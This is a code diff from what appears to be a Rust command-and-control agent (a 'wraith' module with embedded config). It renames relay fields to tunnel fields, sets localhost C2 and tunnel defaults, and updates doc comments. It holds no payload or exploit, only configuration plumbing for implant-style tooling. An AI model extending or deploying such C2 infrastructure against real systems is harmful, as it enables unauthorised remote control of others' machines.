@@ -4,13 +4,14 @@ use serde::{Deserialize, Serialize};
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct Config {
-    /// C2 server address (e.g., "nexus:8080"). Mutually exclusive with tunnel_addr.
+    /// C2 server address (e.g., "localhost:9000"). Mutually exclusive with tunnel_addr.
     pub c2_addr: Option<String>,
-    /// Upstream relay address (e.g., "A:8080"). Mutually exclusive with c2_addr.
+    /// Upstream tunnel server address (e.g., "A:8080"). Mutually exclusive with c2_addr.
     pub tunnel_addr: Option<String>,
-    /// Legacy fields for backward compatibility
-    pub relay_host: String,
-    pub relay_port: u16,
+    /// Tunnel server host for agent connections.
+    pub tunnel_host: String,
+    /// Tunnel server port for agent connections.
+    pub tunnel_port: u16,
     pub c2_host: String,
     pub c2_port: u16,
     pub reconnect: bool,
@@ -26,8 +27,8 @@ impl Default for Config {
         Self {
             c2_addr: None,
             tunnel_addr: None,
-            relay_host: "127.0.0.1".to_string(),
-            relay_port: 4446,
+            tunnel_host: "127.0.0.1".to_string(),
+            tunnel_port: 4446,
             c2_host: "127.0.0.1".to_string(),
             c2_port: 4445,
             reconnect: true,
@@ -45,8 +46,8 @@ impl From<crate::wraith::embedded_config::EmbeddedConfig> for Config {
         Self {
             c2_addr: None,
             tunnel_addr: None,
-            relay_host: ec.relay_host,
-            relay_port: ec.relay_port,
+            tunnel_host: ec.relay_host,
+            tunnel_port: ec.relay_port,
             c2_host: ec.c2_host,
             c2_port: ec.c2_port,
             reconnect: ec.reconnect,
